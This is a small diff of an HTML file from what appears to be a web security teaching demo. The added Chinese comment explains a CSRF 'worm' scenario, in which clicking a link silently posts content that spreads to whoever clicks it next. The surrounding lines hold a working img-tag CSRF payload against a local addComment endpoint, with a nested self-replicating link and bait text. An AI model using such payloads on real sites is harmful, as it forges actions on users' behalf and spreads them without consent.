@@ -16,6 +16,7 @@
 
 		<!-- 循环攻击（蠕虫攻击) -->
 		<!-- a标签内容通过 encodeUrIComponent进行转译，否则链接会有问题 -->
+		<!-- 场景：因为点击了某些链接进入，发现自己莫名发了一个说说，别人点击你的说说在进入自己也会发，这就是上章说的`蠕虫攻击` -->
 		<img src="http://127.0.0.1:8080/ajax/addComment?postId=11&content=<a href=http%3A%2F%2F127.0.0.1%3A8080%2Fajax%2FaddComment%3FpostId%3D11%26content%3D%E6%88%91%E6%98%AF%E6%9D%A5%E8%87%AA%E5%B5%8C%E5%A5%97%E5%9B%BE%E7%89%87GET%E7%9A%84CSRF>点击就送屠龙宝刀！！！</a>" alt="">
 
 		<!-- post的CSRF -->
